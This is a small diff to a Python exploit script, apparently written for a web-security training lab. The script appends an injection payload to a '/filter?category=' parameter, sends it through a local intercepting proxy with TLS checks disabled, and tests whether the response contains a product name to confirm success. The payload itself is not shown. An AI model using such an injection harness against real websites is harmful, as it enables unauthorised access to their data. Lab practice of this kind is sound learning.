@@ -7,12 +7,12 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 #Setting up the proxy
-proxies = {'http': 'http://127.0.0.1:8080', 'https' : "http://127.0.0.1:8080"}
+proxy = {'http': 'http://127.0.0.1:8080', 'https' : "http://127.0.0.1:8080"}
 
 #Exploit Function
 def exploit_executed(url, payload):
     uri = "/filter?category="
-    request = requests.get(url + uri + payload)
+    request = requests.get(url + uri + payload, verify=False, proxies=proxy)
     #An item that only exists if exploit was successful
     if "Babbage Web Spray" in request.text:
         return True
